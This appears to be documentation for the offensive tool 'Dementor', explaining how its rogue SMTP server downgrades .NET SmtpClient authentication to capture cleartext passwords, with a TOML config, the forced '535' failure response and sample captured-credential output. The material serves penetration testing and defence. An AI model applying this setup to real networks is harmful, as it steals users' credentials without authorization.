.. _example_smtp_downgrade:

SMTP Downgrade Attack
=====================

The SMTP server in *Dementor* supports a mechanism to attempt a *"downgrade"* of an authentication attempt
initiated by a target host. This behavior is controlled by the :attr:`SMTP.Server.Downgrade` setting.

.. warning::

    This attack specifically targets the `SmtpClient <https://learn.microsoft.com/en-us/dotnet/api/system.net.mail.smtpclient?view=net-9.0>`_
    component of the .NET Core platform. Although `DE0005 <https://github.com/dotnet/platform-compat/blob/master/docs/DE0005.md>`_ marks this component
    as deprecated and advises against its use, this example demonstrates how *Dementor* can be configured to simulate various attack scenarios.


Prerequisites
-------------

First, let's understand how a simple email can be sent using PowerShell on Windows. Some tutorials recommend the standard ``SmtpClient``,
which, while deprecated, is still functional in many environments. Here's a typical example:

.. code-block:: powershell

    $EmailTo = "darth.vader@contoso.local"
    $EmailFrom = "luke@contoso.local"
    $Subject = "Revelation"
    $Body = "I am your father"
    $Server = "MAILSRV"
    $ServerPort = 22
    $Username = "darth.vader"
    $Password = "Anakin123!"
    $Message = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
    $Client = New-Object System.Net.Mail.SmtpClient($Server, $ServerPort)
    $Client.UseDefaultCredentials = $false
    $Client.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
    $Client.Send($Message)

By default, the client won't require secure connections unless ``EnableSsl`` is explicitly set.
If NTLM authentication is available, it will be used **but the client may fall back to weaker mechanisms** such as
``PLAIN`` or ``LOGIN`` if the server offers them or NTLM authentication wasn't successful.


Tricking ``SmtpClient`` into Revealing Cleartext Passwords
----------------------------------------------------------

You can exploit this fallback behavior by configuring *Dementor*'s SMTP server to either accept only plain-text authentication
or simulate a failure after NTLM auth to force the client to downgrade.

1. **Accept only plain authentication (not recommended):**

   Modify the :attr:`SMTP.Server.AuthMechanisms` setting to exclude ``NTLM``:

   .. code-block:: toml

       [SMTP.Server]
       Port = 22
       AuthMechanisms = [ "PLAIN", "LOGIN" ]

   Sample output from *Dementor* after capturing cleartext credentials:

   .. container:: demo

        .. code-block:: console

           SMTP       192.168.56.115            25     [+] Captured Cleartext Password for darth.vader from 192.168.56.115:
           SMTP       192.168.56.115            25     Cleartext Username: darth.vader
           SMTP       192.168.56.115            25     Cleartext Password: Anakin123!

2. **Downgrade after failed NTLM authentication:**

   In environments where clients try NTLM first, you can simulate a failed NTLM attempt and force the client to
   retry using plain-text credentials.

   .. note::

      This only works if the client has the cleartext password available locally. If the credentials are
      provided as NTLM hashes or tokens, the downgrade will fail.

   *Dementor* sends the following response to trigger the fallback:

   .. code-block::

       535 5.7.3 Authentication unsuccessful

   The default Windows SMTP client will retry using cleartext credentials — if they are present.

   .. figure:: /_static/images/smtp-downgrade_wireshark.png
      :align: center
      :alt: Wireshark trace showing SMTP fallback to cleartext auth

      The client reattempts authentication with cleartext credentials after an NTLM failure.

